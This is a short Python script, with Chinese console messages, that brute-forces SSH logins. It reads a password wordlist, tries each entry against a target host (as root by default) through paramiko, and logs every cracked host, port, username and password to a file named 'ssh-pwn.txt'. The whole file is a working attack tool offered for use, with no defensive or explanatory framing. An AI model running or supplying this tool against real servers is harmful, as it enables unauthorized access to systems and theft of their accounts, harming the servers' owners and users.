# /usr/bin/env/python
# -*- coding:utf-8 -*-
# _auther:d3ckx1

import paramiko
class sgin:
    EXC = '[!]'
    STR = '[*]'
    PLS = '[+]'
    MIN = '[-]'

class force_ssh:
    def __init__(self,host,pwddict,users='root',port=22):
       try:
            print ('正在爆破')
            passwords = open(pwddict,'rb')
            for passwds in passwords.readlines():
                passwdss = passwds.decode(encoding='UTF-8').strip('\r\n')
                self.get_pwn(users,passwdss,host,port)

       except Exception as e:
        print('\033[0;31m'+sgin.EXC+e+'\033[1;37;40m')
        exit()
       


    def get_pwn(self,userss,passwdss,hosts,port):
            try:
                print(sgin.STR+"Now is trying:"+passwdss)
                ssh = paramiko.SSHClient()
                ssh.load_system_host_keys()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hosts, port, userss, passwdss)
                print('\n\033[32m[+] SSH爆破成功！ IP:' + hosts + ' 端口：' + str(port) + ' 账户：' + userss + ' 密码：' + passwdss + '\033[1;37;40m')
                f = open('ssh-pwn.txt', 'a')
                f.write(hosts + ":" + str(port) + " - " + userss + ':' + passwdss)
                f.write('\n')
                ssh.close()

            except:
                pass